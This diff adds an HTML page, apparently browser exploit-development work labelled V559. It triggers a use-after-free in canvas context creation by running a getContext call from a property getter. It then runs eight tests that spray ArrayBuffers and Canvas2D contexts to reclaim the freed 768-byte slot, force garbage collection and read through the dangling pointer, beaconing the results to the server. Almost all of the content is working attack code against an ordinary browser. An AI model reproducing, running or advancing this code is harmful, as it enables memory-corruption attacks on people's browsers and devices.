@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V559</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V559-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<30;g++){
+    junk=[];for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+    junk=null;
+  }
+}
+
+b('BOOT','V559-reclaim-verify');
+
+// T1: Normal baseline
+(function(){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.save();ctx.lineWidth=42;ctx.restore();
+  b('T1','PASS-baseline');
+})();
+
+// T2: Mass reclaim — create MANY Canvas2D contexts to maximize chance one lands in freed slot
+// Then use getContextAttributes() as safe oracle before trying lineWidth
+(function(){
+  try{
+    var u=triggerUAF();
+    var contexts=[];
+    var canvases=[];
+    // Create 200 Canvas2D contexts to saturate the 768-byte freelist
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=42+i;
+      contexts.push(ctx);
+      canvases.push(c);
+    }
+    // Now test: can we read getContextAttributes() through dangling? (safe oracle)
+    var attrs=null;
+    try{
+      attrs=u.ctx.getContextAttributes();
+    }catch(e){
+      b('T2','oracle-ERR:'+e.message);
+      return;
+    }
+    b('T2','oracle-OK:'+JSON.stringify(attrs));
+    // If oracle passed, try lineWidth read
+    var lw=u.ctx.lineWidth;
+    b('T2-LW','lw='+lw);
+    contexts=null;canvases=null;
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: Targeted reclaim — trigger UAF, spray exactly 768-byte ABs first to fill freelist holes,
+// then allocate ONE Canvas2D to land in the exact slot
+(function(){
+  try{
+    var u=triggerUAF();
+    // Fill up freelist holes with ABs first
+    var fillers=[];
+    for(var i=0;i<100;i++) fillers.push(new ArrayBuffer(768));
+    // Now ONE new canvas should grab the next 768B slot (hopefully our freed one)
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=77;
+    // Free the AB fillers to make room
+    fillers=null;
+    // Safe oracle
+    var attrs=null;
+    try{
+      attrs=u.ctx.getContextAttributes();
+    }catch(e){
+      b('T3','oracle-ERR:'+e.message);
+      return;
+    }
+    b('T3','oracle-OK:'+JSON.stringify(attrs));
+    var lw=u.ctx.lineWidth;
+    b('T3-LW','lw='+lw+' (expect 77 if alias)');
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: AB reclaim then Canvas2D — AB fills the slot, we read through dangling,
+// then free AB and put Canvas2D in its place
+(function(){
+  try{
+    var u=triggerUAF();
+    // AB spray to reclaim the slot
+    var abs=[];
+    for(var i=0;i<50;i++){
+      var ab=new ArrayBuffer(768);
+      abs.push(ab);
+      var u8=new Uint8Array(ab);
+      // Write a recognizable pattern
+      u8[0]=0xDE;u8[1]=0xAD;u8[2]=0xBE;u8[3]=0xEF;
+    }
+    b('T4-AB','sprayed-50x768');
+    // Don't touch dangling ref yet — AB is in slot, lineWidth would read garbage
+    // Free ABs
+    abs=null;
+    // Now Canvas2D to reclaim
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=55;
+    // Oracle
+    try{
+      var attrs=u.ctx.getContextAttributes();
+      b('T4','oracle-OK:'+JSON.stringify(attrs));
+    }catch(e){
+      b('T4','oracle-ERR:'+e.message);
+      return;
+    }
+    var lw=u.ctx.lineWidth;
+    b('T4-LW','lw='+lw+' (expect 55 if alias)');
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: Multiple UAFs — trigger 10 UAFs, create 10 new contexts, check which ones alias
+(function(){
+  try{
+    var uafs=[];
+    for(var i=0;i<10;i++){
+      uafs.push(triggerUAF());
+    }
+    b('T5-UAFS','triggered-10');
+    // Create 10 new contexts
+    var newCtxs=[];
+    for(var i=0;i<10;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=100+i;
+      newCtxs.push(ctx);
+    }
+    b('T5-NEW','created-10');
+    // Check each dangling ref with oracle
+    var results=[];
+    for(var i=0;i<10;i++){
+      try{
+        var attrs=uafs[i].ctx.getContextAttributes();
+        var lw=uafs[i].ctx.lineWidth;
+        results.push('u'+i+':lw='+lw);
+      }catch(e){
+        results.push('u'+i+':ERR');
+      }
+    }
+    b('T5',results.join('|'));
+    uafs=null;newCtxs=null;
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// T6: Single UAF + immediate same-canvas getContext('2d') — does the canvas re-create?
+(function(){
+  try{
+    var u=triggerUAF();
+    // The canvas (u.canvas) now has bitmaprenderer. Can we get 2d again?
+    var ctx2=u.canvas.getContext('2d');
+    b('T6','reget-2d:'+(ctx2?'got-ctx':'null'));
+    if(ctx2){
+      ctx2.lineWidth=33;
+      var lw=u.ctx.lineWidth;
+      b('T6-LW','lw='+lw+' (expect 33 if same object)');
+    }
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// T7: GC with ALL refs alive (control — must survive)
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=42;
+    // Keep everything alive
+    forceGC();
+    var lw=u.ctx.lineWidth;
+    b('T7','post-gc-lw='+lw+' (expect 42 if alias survived gc)');
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: Null dangling wrapper BEFORE GC, read through new ctx only
+(function(){
+  try{
+    var u=triggerUAF();
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    var ctxN=c2.getContext('2d');
+    ctxN.lineWidth=88;
+    // Null the dangling ref — GC should collect it safely
+    // deref() goes to m_canvas which is the OLD canvas (bitmaprenderer now)
+    // That canvas is still alive so deref is safe
+    var danglingCtx=u.ctx;
+    u.ctx=null; u=null;
+    forceGC();
+    // Now read through new context — should be fine
+    var lw=ctxN.lineWidth;
+    b('T8','post-gc-new-lw='+lw+' (expect 88)');
+    // Can we still use danglingCtx? (it was nulled from u but we kept local ref)
+    var lw2=danglingCtx.lineWidth;
+    b('T8-DANG','post-gc-dang-lw='+lw2);
+    danglingCtx=null;
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+b('DONE','V559-all-complete');
+</script>
+</body></html>
